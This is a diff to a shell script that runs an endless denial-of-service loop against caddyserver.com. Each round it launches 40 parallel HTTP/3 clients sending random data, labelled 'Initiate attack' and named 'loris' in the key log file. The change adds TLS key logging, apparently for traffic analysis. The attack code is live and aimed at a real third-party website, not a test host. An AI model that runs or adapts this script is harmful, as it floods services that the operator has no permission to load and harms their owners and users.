@@ -4,13 +4,16 @@
 #The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 #THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
+SCRIPT_DIR="$(pwd)"
+SSLKEYLOGFILE="$SCRIPT_DIR/sslkeys-loris.log"
+export SSLKEYLOGFILE
 
 while true
 do
    echo "\e[0;31mInitiate attack\e[0m"
    #Generate random hex data
    x=$(openssl rand -hex 32)
-   sudo seq 1 40 | timeout 5s xargs -n1 -P40 python3 examples/http3_client.py -d $x https://caddyserver.com/
+   sudo seq 1 40 | timeout 5s xargs -n1 -P40 python3 examples/http3_client.py -l sslkeys-loris.log -d $x https://caddyserver.com/
    echo "\e[0;32mSleep...\e[0m"
    sleep 5;
 done
